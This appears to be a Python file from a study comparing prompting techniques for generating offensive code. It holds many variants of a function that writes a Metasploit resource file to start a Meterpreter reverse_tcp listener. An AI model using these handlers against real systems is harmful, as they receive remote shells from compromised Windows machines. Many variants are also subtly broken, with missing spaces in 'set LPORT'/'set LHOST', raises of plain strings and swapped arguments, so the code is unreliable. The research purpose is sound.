
import ipaddress
import logging


def ground_truth_code_setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def persona_setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as file:
		file.write('use exploit/multi/handler\n')
		file.write('set payload windows/meterpreter/reverse_tcp\n')
		file.write('set LPORT'+ str(lport) + '\n')
		file.write('set LHOST'+ str(lhost) + '\n')
		file.write('exploit -j -z\n')
		file.write('setg DisablePayloadHandler 1\n')
            
def template_setupHandler(configFile, lhost, lport):
    try:
        if not isinstance(configFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
            raise TypeError('Invalid input type. configFile must be a string, lhost must be a string and lport must be an integer.')
        if lport < 0 or lport > 65535:
            raise ValueError('Invalid port number. Port must be between 0 and 65535.')
        handlerConfig = 'use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT'+ str(lport) + '\nset LHOST'+ lhost + '\nexploit -j -z\nsetg DisablePayloadHandler 1\n'
        with open(configFile, 'w') as file:
            file.write(handlerConfig)
    except TypeError as e:
        raise(f'Type error: {e}')
    except FileNotFoundError:
        raise('File not found.')
    except PermissionError:
        raise('Permission denied.')
    except Exception as e:
        raise(f'Error: {e}')
        
def question_refnement_setupHandler(payload, host, port, exploit_settings):
    try:
        with open('exploit_config.rc', 'w') as file:
            file.write('use multi/handler\n')
            file.write(f'set PAYLOAD {payload}\n')
            file.write(f'set LPORT {port}\n')
            file.write(f'set LHOST {host}\n')
            for setting, value in exploit_settings.items():
                file.write(f'set {setting.upper()} {value}\n')
            file.write('exploit\n')
            file.write('exit\n')
    except Exception as e:
        raise(f'Failed to create exploit configuration file: {e}')
        
def alternative_approaches_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as f:
            f.write('use exploit/multi/handler\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')
            f.write('setg DisableExitFunc true\n')
    except Exception as e:
        raise(f'An error occurred: {str(e)}')
    return configFile

def context_manager_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}\n')
        file.write(f'set LHOST {lhost}\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')
        
def flipped_interaction_3__setupHandler(configFile, lhost, lport):
	try:
		if not isinstance(lport, int) or not 0 <= lport <= 65535:
			raise ValueError("Invalid port number")
		if not lhost or not isinstance(lhost, str):
			raise ValueError("Invalid host or empty host")
		with open(configFile, 'w') as f:
			f.write('use exploit/multi/handler\n')
			f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
			f.write('set LPORT'+ str(lport) + '\n')
			f.write('set LHOST'+ lhost + '\n')
			f.write('exploit -j -z\n')
			f.write('setg DisablePayloadHandler 1\n')
	except Exception as e:
		raise Exception(f"An error occurred while trying to write to {configFile}: {str(e)}")
     
def flipped_interaction_4__setupHandler(configFile, lhost, lport):
    try:
        ipaddress.ip_address(lhost)
    except ValueError:
        raise('Invalid lhost value: must be a valid IP address')
        raise ValueError('Invalid lhost value: must be a valid IP address')
    if not isinstance(lport, int) or not 1 <= lport <= 65535:
        raise('Invalid lport value: must be an integer between 1 and 65535')
        raise ValueError('Invalid lport value: must be an integer between 1 and 65535')
    try:
        with open(configFile, 'w') as f:
            f.write('use exploit/multi/handler\n')
            f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
            f.write('set LPORT '+ str(lport) + '\n')
            f.write('set LHOST '+ lhost + '\n')
            f.write('exploit -j -z\n')
            f.write('setg DisablePayloadHandler 1\n')
    except OSError as e:
        raise(f'Error writing to {configFile}: {e}'); raise
    
def flipped_interaction_5__setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write('set payload windows/meterpreter/reverse_tcp\n')
        f.write('set LPORT ' + str(lport) + '\n')
        f.write('set LHOST ' + lhost + '\n')
        f.write('exploit -j -z\n')
        f.write('setg DisablePayloadHandler 1\n')


import os
def iterative_prompting_3__setupHandler(configFile, lhost, lport):
    try:
        if not isinstance(configFile, str):
            raise TypeError('configFile must be a string')
        if not isinstance(lhost, str):
            raise TypeError('lhost must be a string')
        if not isinstance(lport, int):
            raise TypeError('lport must be an integer')
        if lport < 1 or lport > 65535:
            raise ValueError('Invalid port number')
        if not os.path.isabs(configFile):
            configFile = os.path.abspath(configFile)
        if not os.path.exists(os.path.dirname(configFile)):
            os.makedirs(os.path.dirname(configFile))
        with open(configFile, 'w') as f:
            f.write('use exploit/multi/handler\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')
            f.write('setg DisablePayloadHandler 1\n')
    except TypeError as e:
        raise(f'TypeError: {e}')
    except ValueError as e:
        raise(f'ValueError: {e}')
    except OSError as e:
        raise(f'Error writing to file: {e}')
    except Exception as e:
        raise(f'An error occurred: {e}')
        
def iterative_rpompting_4__setupHandler(configFile, lhost, lport):
    if not isinstance(configFile, str) or not configFile.strip():
        raise ValueError('Invalid configFile. It must be a non-empty string.')
    if not isinstance(lhost, str) or not lhost.strip():
        raise ValueError('Invalid lhost. It must be a non-empty string.')
    if not isinstance(lport, int) or lport < 0 or lport > 65535:
        raise ValueError('Invalid lport. It must be an integer between 0 and 65535.')
    try:
        with open(configFile, 'xb') as f:
            f.write(b'use exploit/multi/handler\n')
            f.write(b'set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n'.encode())
            f.write(f'set LHOST {lhost}\n'.encode())
            f.write(b'exploit -j -z\n')
            f.write(b'setg DisablePayloadHandler 1\n')
    except FileExistsError:
        raise RuntimeError(f'configFile {configFile} already exists.')
    except OSError as e:
        raise RuntimeError(f'Failed to write to configFile: {e}')
    
def iterative_prompting_5__setupHandler(configFile, lhost, lport):
	try:
		if not isinstance(configFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
			raise TypeError('Invalid input types')
		if not configFile.strip() or not lhost.strip() or lport < 1 or lport > 65535:
			raise ValueError('Invalid input values')
		import os
		if not os.path.exists(os.path.dirname(configFile)):
			os.makedirs(os.path.dirname(configFile))
		with open(configFile, 'w',newline='') as f:
			for config in [('use exploit/multi/handler\n'), ('set payload windows/meterpreter/reverse_tcp\n'), (f'set LPORT {lport}\n'), (f'set LHOST {lhost}\n'), ('exploit -j -z\n'), ('setg DisablePayloadHandler 1\n')]:
				f.write(config)
	except TypeError as e:
		raise(f'TypeError occurred: {e}')
	except ValueError as e:
		raise(f'ValueError occurred: {e}')
	except PermissionError:
		raise('Permission denied writing configuration file')
	except IOError as e:
		raise(f'An error occurred while writing the configuration file: {e}')
	except Exception as e:
		raise(f'An error occurred: {e}')

def few_shots_prompting_setupHandler(configFile, lhost, lport):
	f = open(configFile, 'w')
	f.write('use exploit/multi/handler\n')
	f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
	f.write('set LPORT'+ str(lport) + '\n')
	f.write('set LHOST'+ lhost + '\n')
	f.write('exploit -j -z\n')
	f.write('setg DisablePayloadHandler 1\n')
	f.close()
     
def cot_prompting_setupHandler(configFile, lhost, lport):
	with open(configFile, 'w') as f:
		f.write('use exploit/multi/handler\n')
		f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
		f.write('set LPORT'+ str(lport) + '\n')
		f.write('set LHOST'+ lhost + '\n')
		f.write('exploit -j -z\n')
		f.write('setg DisablePayloadHandler 1\n')
          
def fact_check_list_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as config:
            config.write('use exploit/multi/handler\n')
            config.write('set payload windows/meterpreter/reverse_tcp\n')
            config.write(f'set LPORT {lport}\n')
            config.write(f'set LHOST {lhost}\n')
            config.write('exploit -j -z\n')
            config.write('setg DisablePayloadHandler 1\n')
    except FileNotFoundError:
        raise('The specified file does not exist.')
    except PermissionError:
        raise('You do not have permission to write to the file.')
    except Exception as e:
        raise(f'An unexpected error occurred: {e}')
        
def not_interactive_mix_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as config:
            config.write('use exploit/multi/handler\n')
            config.write('set payload windows/meterpreter/reverse_tcp\n')
            config.write(f'set LPORT {lport}\n')
            config.write(f'set LHOST {lhost}\n')
            config.write('exploit -j -z\n')
            config.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        raise(f'IOError occurred: {e}')
    except Exception as e:
        raise(f'Unexpected error occurred: {e}')
        
import os
import ipaddress
def interactive_mix_setupHandler(configFile, lport, lhost):
    try:
        if not isinstance(lport, int) or not 1 <= lport <= 65535:
            raise ValueError("Invalid port number. Port must be between 1 and 65535.")
        try:
            ip = ipaddress.ip_address(lhost)
        except ValueError:
            raise ValueError("Invalid IP address.")
        content = [
            'use exploit/multi/handler\n',
         'set payload windows/meterpreter/reverse_tcp\n',
            f'set LPORT {lport}\n',
            f'set LHOST {lhost}\n',
            'exploit -j -z\n',
         'setg DisablePayloadHandler 1\n'
        ]
        with open(configFile, 'w') as f:
            f.writelines(content)
    except PermissionError:
        raise PermissionError(f"Permission denied while writing to {configFile}.")
    except OSError as e:
        raise OSError(f"OS-related error occurred while writing to {configFile}: {str(e)}")
    
def baseline_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write('set payload '+'windows/meterpreter/reverse_tcp\n')
        f.write('set LPORT'+ str(lport) + '\n')
        f.write('set LHOST'+ lhost + '\n')
        f.write('exploit -j -z\n')
        f.write('setg DisablePayloadHandler 1\n')
